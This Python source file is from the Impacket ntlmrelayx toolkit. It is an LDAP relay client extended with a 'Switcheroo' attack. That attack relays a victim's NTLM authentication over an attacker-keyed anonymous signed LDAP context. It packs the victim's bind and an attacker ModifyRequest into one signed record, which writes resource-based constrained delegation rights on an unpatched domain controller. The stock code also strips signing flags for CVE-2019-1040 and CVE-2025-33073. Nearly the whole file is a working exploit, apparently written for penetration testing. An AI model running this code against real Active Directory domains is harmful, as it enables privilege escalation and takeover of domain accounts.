# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Protocol Client
#   LDAP client for relaying NTLMSSP authentication to LDAP servers
#   The way of using the ldap3 library is quite hacky, but its the best
#   way to make the lib do things it wasn't designed to without touching
#   its code
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import sys
from struct import unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.operation import bind
try:
    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
except ImportError:
    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: 'python -m pip install ldap3 --upgrade'")
    sys.exit(1)

from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import (
    NTLMAuthChallenge,
    NTLMSSP_AV_FLAGS,
    AV_PAIRS,
    NTLMAuthNegotiate,
    NTLMSSP_NEGOTIATE_SIGN,
    NTLMSSP_NEGOTIATE_SEAL,
    NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    NTLMAuthChallengeResponse,
    NTLMSSP_NEGOTIATE_KEY_EXCH,
    NTLMSSP_NEGOTIATE_VERSION)
from impacket.spnego import SPNEGO_NegTokenResp

# --- Switcheroo additions: same-record cross-user LDAP-signing bypass -------------------
# The LDAP (389) plugin below is replaced by SwitcherooLDAPRelayClient (defined at the end
# of this file). LDAPS (636) keeps the stock ldap3 behaviour. The vanilla LDAPRelayClient
# class is left intact for reference/subclassing but is no longer registered for "LDAP".
import os as _sw_os
import random as _sw_random
import struct as _sw_struct
import time as _sw_time
from impacket import ntlm as _sw_ntlm
from impacket.ldap.ldap import LDAPConnection as _SwLDAPConnection
from impacket.ldap.ldapasn1 import (
    BindRequest as _SwBindRequest,
    LDAPMessage as _SwLDAPMessage,
    ModifyRequest as _SwModifyRequest,
    ResultCode as _SwResultCode,
    Scope as _SwScope,
)
from impacket.ldap.ldaptypes import LDAP_SID as _SwLDAP_SID
from impacket.spnego import (
    SPNEGOCipher as _SwSPNEGOCipher,
    SPNEGO_NegTokenInit as _SwNegInit,
    SPNEGO_NegTokenResp as _SwNegResp,
    TypesMech as _SwTypesMech,
)
from pyasn1.codec.ber import decoder as _sw_decoder, encoder as _sw_encoder


PROTOCOL_CLIENT_CLASSES = ["SwitcherooLDAPRelayClient", "LDAPSRelayClient"]

class LDAPRelayClientException(Exception):
    pass

class LDAPRelayClient(ProtocolClient):
    PLUGIN_NAME = "LDAP"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)

        # When exploiting CVE-2019-1040, remove message signing flag
        # For SMB->LDAP this is required otherwise it triggers LDAP signing
        # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
        # CVE-2025-33073 also requires removing the sign flags
        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

        # When exploiting CVE-2025-33073, remove SEAL in addition to SIGN/ALWAYS_SIGN.
        if self.serverConfig.remove_sign_seal:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL

        self.negotiateMessage = negoMessage.getData()

        # Warn if the relayed target requests signing, which will break our attack
        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
            LOG.warning('The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)')

        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode('ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                    result = response[0]
                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        self.sessionData['CHALLENGE_MESSAGE'] = challenge
                        return challenge
                else:
                    raise LDAPRelayClientException('Server did not offer NTLM authentication!')

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            if respToken2.isNegoExSelected():
                LOG.info("Target selected NEGOEX/PKU2U authentication, relay currently not supported for this mechanism")
                raise Exception("NEGOEX/PKU2U relay is not supported")
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            token = authMessage.getData()

        if self.serverConfig.remove_sign_seal:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
            token = authMessage.getData()

        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            return None, STATUS_SUCCESS
        else:
            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
                raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
        return None, STATUS_ACCESS_DENIED

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    #Placeholder function for ldap3
    def parse_challenge_message(self, message):
        pass

    def keepAlive(self):
        # Basic LDAP query to keep the connection alive
        self.session.search(search_base='',
            search_filter='(objectClass=*)',
            search_scope='BASE',
            attributes=['namingContexts'])

class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True


# =========================================================================================
# Switcheroo: same-record cross-user LDAP-signing bypass
# -----------------------------------------------------------------------------------------
# Opens an attacker-known ANONYMOUS signed LDAP/389 SASL context (X), relays the victim's
# NTLM over it, then stacks the victim's final GSS-SPNEGO Bind and a single attacker
# ModifyRequest into ONE SASL record signed with X's key. The DC verifies the record under
# X, completes the Bind as the victim, and (on an unpatched DC) runs the trailing Modify
# with the victim's privileges. Reuses ntlmrelayx's native LDAP attack args:
#   --delegate-access  + --sid <SID>   -> RBCD write on the relayed machine's own object.
# No credentials are required for X (anonymous NTLM key-exchange bootstrap).
# =========================================================================================
_SW_SPNEGO_MECHLIST = b"0\x0c\x06\n+\x06\x01\x04\x01\x827\x02\x02\n"


def _sw_ldap_message(operation):
    message = _SwLDAPMessage()
    message["messageID"] = _sw_random.randrange(1, 2147483647)
    message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
    return _sw_encoder.encode(message)


def _sw_read_exact(sock, length):
    value = b""
    while len(value) < length:
        chunk = sock.recv(length - len(value))
        if not chunk:
            raise EOFError("connection closed")
        value += chunk
    return value


def _sw_bind_gss(token):
    request = _SwBindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    request["authentication"]["sasl"]["credentials"] = token
    return request


def _sw_bind_sicily_negotiate(token):
    request = _SwBindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sicilyNegotiate"] = token
    return request


def _sw_establish_anonymous_context(connection):
    """Bootstrap an anonymous NTLM SASL sign context with an attacker-selected key."""
    type1 = _sw_ntlm.getNTLMSSPType1("", "", signingRequired=True, use_ntlmv2=False)
    blob = _SwNegInit()
    blob["MechTypes"] = [_SwTypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
    blob["MechToken"] = type1.getData()
    answer = connection.sendReceive(_sw_bind_gss(blob.getData()))
    response = answer[0]["protocolOp"]["bindResponse"]
    if int(response["resultCode"]) != int(_SwResultCode("saslBindInProgress")):
        raise LDAPRelayClientException("anonymous Type 1 rejected: %s" % response["resultCode"].prettyPrint())
    challenge_raw = _SwNegResp(response["serverSaslCreds"].asOctets())["ResponseToken"]
    challenge = _sw_ntlm.NTLMAuthChallenge(challenge_raw)

    flags = type1["flags"]
    for flag in (
        _sw_ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
        _sw_ntlm.NTLMSSP_NEGOTIATE_128,
        _sw_ntlm.NTLMSSP_NEGOTIATE_56,
        _sw_ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH,
        _sw_ntlm.NTLMSSP_NEGOTIATE_SEAL,
        _sw_ntlm.NTLMSSP_NEGOTIATE_SIGN,
        _sw_ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    ):
        if not challenge["flags"] & flag:
            flags &= ~flag
    if not flags & _sw_ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH:
        raise LDAPRelayClientException("target did not negotiate the anonymous attacker-selected key")

    exported_key = _sw_os.urandom(16)
    type3 = _sw_ntlm.NTLMAuthChallengeResponse("", "", challenge["challenge"])
    type3["flags"] = flags | 0x00000800  # NTLMSSP_NEGOTIATE_ANONYMOUS
    type3["domain_name"] = b""
    type3["user_name"] = b""
    type3["host_name"] = b""
    type3["lanman"] = b"\x00"
    type3["ntlm"] = b""
    type3["session_key"] = _sw_ntlm.generateEncryptedSessionKey(b"\x00" * 16, exported_key)

    cipher = _SwSPNEGOCipher(flags=type3["flags"], randomSessionKey=exported_key)
    final = _SwNegResp()
    final["ResponseToken"] = type3.getData()
    final["mechListMIC"] = cipher.sign(_SW_SPNEGO_MECHLIST, 0, reset_cipher=True).getData()
    response = connection.sendReceive(_sw_bind_gss(final.getData()))[0]["protocolOp"]["bindResponse"]
    if int(response["resultCode"]) != int(_SwResultCode("success")):
        raise LDAPRelayClientException("anonymous final rejected: %s" % response["resultCode"].prettyPrint())

    # Wire up the connection's internal SASL state so encrypt()/decrypt() use our key.
    connection._LDAPConnection__spnego_cipher_blob = cipher
    connection._LDAPConnection__auth_type = "NTLM-sasl"
    connection._LDAPConnection__binded = True
    connection._LDAPConnection__signing = True
    connection.sequenceNumber = 1


class SwitcherooLDAPRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAP"

    def __init__(self, serverConfig, target, targetPort=389, extendedSecurity=True):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.raw = None
        self._sw_base_dn = ""
        self._sw_authenticated = False

    def _sw_parse_creds(self):
        """Parse --switcheroo-creds (DOMAIN/user:password) -> (domain, user, password) or None."""
        raw = getattr(self.serverConfig, "switcheroo_creds", None)
        if not raw:
            return None
        from impacket.examples.utils import parse_credentials
        domain, username, password = parse_credentials(raw)
        if not username:
            raise LDAPRelayClientException("--switcheroo-creds must be DOMAIN/user:password")
        return domain, username, password

    def _sw_discover_base_dn(self):
        # Anonymous simple bind can read RootDSE (but not search below it), so we use a
        # throwaway connection to learn defaultNamingContext for the heuristic target DN.
        probe = _SwLDAPConnection("ldap://%s:%s" % (self.targetHost, self.targetPort),
                                  "", dstIp=self.targetHost, signing=False)
        try:
            probe.login("", "", "", authenticationChoice="simple")
            entries = probe.search(searchBase="", scope=_SwScope("baseObject"),
                                   searchFilter="(objectClass=*)", attributes=["defaultNamingContext"])
            for entry in entries:
                for attr in entry["attributes"]:
                    if str(attr["type"]).lower() == "defaultnamingcontext":
                        return str(attr["vals"][0])
        finally:
            try:
                probe.close()
            except Exception:
                pass
        return ""

    def _sw_enabled(self):
        return bool(getattr(self.serverConfig, "switcheroo", False))

    def initConnection(self):
        if not self._sw_enabled():
            return LDAPRelayClient.initConnection(self)
        creds = self._sw_parse_creds()
        if creds:
            # Authenticated X: a real signed SASL login, so it can LDAP-search to resolve DNs/SIDs.
            domain, username, password = creds
            self.raw = _SwLDAPConnection("ldap://%s:%s" % (self.targetHost, self.targetPort),
                                         "", dstIp=self.targetHost, signing=True)
            self.raw.login(username, password, domain, "", "", authenticationChoice="sasl")
            self._sw_authenticated = True
            LOG.info("Switcheroo: authenticated attacker LDAP SASL context established (X) as %s\\%s"
                     % (domain or ".", username))
        else:
            self.raw = _SwLDAPConnection("ldap://%s:%s" % (self.targetHost, self.targetPort),
                                         "", dstIp=self.targetHost, signing=False)
            _sw_establish_anonymous_context(self.raw)
            self._sw_authenticated = False
            LOG.info("Switcheroo: anonymous attacker-keyed LDAP SASL context established (X)")
        try:
            self._sw_base_dn = self._sw_discover_base_dn()
        except Exception as error:
            LOG.debug("Switcheroo base DN discovery failed: %s" % error)
        self.session = self.raw
        return True

    def _sw_resolve(self, victim_user, escalate, sid_flag, explicit_dn=None):
        """Authenticated-X path: resolve the victim object DN (any OU) and the grantee SID via
        a SEPARATE authenticated LDAP connection (the relay connection is mid-Bind and cannot
        be reused for a search). If explicit_dn is given, the DN search is skipped. Returns
        (dn, grant_sid)."""
        domain, username, password = self._sw_parse_creds()
        base = self._sw_base_dn
        conn = _SwLDAPConnection("ldap://%s:%s" % (self.targetHost, self.targetPort),
                                 base, dstIp=self.targetHost, signing=True)
        conn.login(username, password, domain, "", "", authenticationChoice="sasl")
        try:
            if explicit_dn:
                dn = explicit_dn
            else:
                if not base:
                    raise LDAPRelayClientException("could not determine base DN")
                entries = conn.search(searchBase=base, scope=_SwScope("wholeSubtree"),
                                      searchFilter="(sAMAccountName=%s)" % victim_user,
                                      attributes=["distinguishedName", "objectSid"])
                dn = None
                for entry in entries:
                    try:
                        attrs = entry["attributes"]        # skip referrals (no 'attributes' field)
                    except Exception:
                        continue
                    for attr in attrs:
                        if str(attr["type"]).lower() == "distinguishedname":
                            dn = str(attr["vals"][0])
                if not dn:
                    raise LDAPRelayClientException("victim object '%s' not found via authenticated search" % victim_user)
            if sid_flag and escalate:
                grant_sid = escalate                       # --sid: escalate is already a SID
            elif escalate:                                  # resolve account name -> objectSid
                sid = None
                res = conn.search(searchBase=base, scope=_SwScope("wholeSubtree"),
                                  searchFilter="(sAMAccountName=%s)" % escalate, attributes=["objectSid"])
                for entry in res:
                    try:
                        attrs = entry["attributes"]
                    except Exception:
                        continue
                    for attr in attrs:
                        if str(attr["type"]).lower() == "objectsid":
                            sid = _SwLDAP_SID(data=bytes(attr["vals"][0])).formatCanonical()
                if not sid:
                    raise LDAPRelayClientException("grantee '%s' not found to resolve its SID" % escalate)
                grant_sid = sid
            else:
                raise LDAPRelayClientException("supply a grantee with --escalate-user (account name, or SID with --sid)")
            return dn, grant_sid
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def killConnection(self):
        if not self._sw_enabled():
            return LDAPRelayClient.killConnection(self)
        if self.raw is not None:
            try:
                self.raw.close()
            except Exception:
                pass
            self.raw = None
        self.session = None

    def sendNegotiate(self, negotiateMessage):
        if not self._sw_enabled():
            return LDAPRelayClient.sendNegotiate(self, negotiateMessage)
        # Relay the victim's NTLM NEGOTIATE in a GSS-SPNEGO Bind over the anonymous X context.
        type1 = _sw_ntlm.NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = _SwNegInit()
        blob["MechTypes"] = [_SwTypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = type1.getData()
        answer = self.raw.sendReceive(_sw_bind_gss(blob.getData()))
        result = answer[0]["protocolOp"]["bindResponse"]
        if int(result["resultCode"]) != int(_SwResultCode("saslBindInProgress")):
            raise LDAPRelayClientException("victim NEGOTIATE rejected: %s" % result["resultCode"].prettyPrint())
        target = _SwNegResp(result["serverSaslCreds"].asOctets())
        challenge = _sw_ntlm.NTLMAuthChallenge()
        challenge.fromString(target["ResponseToken"])
        self.sessionData["CHALLENGE_MESSAGE"] = challenge
        return challenge

    def _sw_build_operation(self, victim_user):
        """Return (dn, attribute, value) for the stacked ModifyRequest from native args."""
        cfg = self.serverConfig
        delegate = getattr(cfg, "delegateaccess", False)
        sid_flag = getattr(cfg, "sid", False)          # --sid: treat --escalate-user as a raw SID
        escalate = getattr(cfg, "escalateuser", None)  # --escalate-user: grantee (SID when --sid set)
        if not delegate:
            raise LDAPRelayClientException(
                "Switcheroo currently wires the RBCD path; invoke with "
                "--delegate-access --escalate-user <SID> --sid")
        if not victim_user.endswith("$"):
            raise LDAPRelayClientException(
                "RBCD (--delegate-access) requires a relayed machine account; victim '%s' is not a machine"
                % victim_user)
        explicit_dn = getattr(cfg, "switcheroo_dn", None)  # --switcheroo-dn: exact target object DN
        if self._sw_authenticated:
            # Authenticated X can search: resolve the exact DN (any OU, incl. DCs) and the grantee
            # SID (from --escalate-user account name, or a raw SID with --sid). An explicit --switcheroo-dn
            # overrides the DN search.
            if explicit_dn and sid_flag and escalate:
                target_dn, grant_sid = explicit_dn, escalate   # nothing to search
            else:
                target_dn, grant_sid = self._sw_resolve(victim_user, escalate, sid_flag, explicit_dn)
        else:
            if not (escalate and sid_flag):
                # Anonymous X cannot resolve an account name to a SID, so require an explicit SID.
                raise LDAPRelayClientException(
                    "Switcheroo (anonymous X) needs an explicit grantee SID: pass --escalate-user <SID> --sid, "
                    "or supply --switcheroo-creds to resolve names automatically")
            grant_sid = escalate
            if explicit_dn:
                # Explicit DN lets anonymous X target any object (DC/custom OU) without a search.
                target_dn = explicit_dn
            else:
                if not self._sw_base_dn:
                    raise LDAPRelayClientException(
                        "could not determine base DN; pass --switcheroo-dn <DN> explicitly")
                # No DN given: derive the default-container DN heuristically.
                target_dn = "CN=%s,CN=Computers,%s" % (victim_user[:-1], self._sw_base_dn)
        from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
        descriptor = create_empty_sd()
        descriptor["Dacl"].aces.append(create_allow_ace(grant_sid))
        LOG.info("Switcheroo: RBCD target=%s grant-SID=%s" % (target_dn, grant_sid))
        return target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()

    def _sw_modify(self, dn, attribute, value):
        request = _SwModifyRequest()
        request["object"] = dn
        request["changes"][0]["operation"] = 2  # replace
        request["changes"][0]["modification"]["type"] = attribute
        request["changes"][0]["modification"]["vals"].setComponents(value)
        return request

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if not self._sw_enabled():
            return LDAPRelayClient.sendAuth(self, authenticateMessageBlob, serverChallenge)
        token = authenticateMessageBlob
        if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)["ResponseToken"]
        type3 = NTLMAuthChallengeResponse()
        type3.fromString(token)
        encoding = "utf-16le" if type3["flags"] & 0x00000001 else "ascii"
        victim = "%s\\%s" % (type3["domain_name"].decode(encoding), type3["user_name"].decode(encoding))

        try:
            dn, attribute, value = self._sw_build_operation(type3["user_name"].decode(encoding))
        except LDAPRelayClientException as error:
            LOG.error("Switcheroo: %s" % error)
            return None, STATUS_ACCESS_DENIED

        # Victim final Bind (AUTHENTICATE wrapped in a GSS-SPNEGO NegTokenResp, preserving the
        # victim's own mechListMIC) + attacker Modify, stacked into ONE SASL record signed with X.
        final = _SwNegResp()
        final["ResponseToken"] = token
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
            final["mechListMIC"] = authenticateMessageBlob[-16:]
        record = _sw_ldap_message(_sw_bind_gss(final.getData())) + _sw_ldap_message(self._sw_modify(dn, attribute, value))
        wire = self.raw.encrypt(record)
        self.raw._socket.sendall(wire)
        LOG.info("Switcheroo: sent same-record frame victim=%s dn=%s attribute=%s" % (victim, dn, attribute))

        self.raw._socket.settimeout(4)
        results = {}
        try:
            for label in ("Bind", "Modify"):
                length = _sw_struct.unpack(">I", _sw_read_exact(self.raw._socket, 4))[0]
                plaintext = self.raw.decrypt(_sw_struct.pack(">I", length) + _sw_read_exact(self.raw._socket, length))
                message, _ = _sw_decoder.decode(plaintext, asn1Spec=_SwLDAPMessage())
                response = message["protocolOp"].getComponent()
                code = response["resultCode"].prettyPrint() if "resultCode" in response else "n/a"
                results[label] = code
                LOG.info("Switcheroo:   %s -> %s" % (label, code))
        except Exception as error:
            LOG.info("Switcheroo:   Modify response unavailable: %s: %s (trailing op discarded by target)"
                     % (type(error).__name__, error))

        if results.get("Modify") == "success":
            LOG.info("Switcheroo: SUCCESS - trailing operation executed as %s" % victim)
        else:
            LOG.warning("Switcheroo: trailing operation did not execute (target likely patched)")
        # The operation (if any) already ran in-record; stop ntlmrelayx's normal attack path.
        return None, STATUS_ACCESS_DENIED
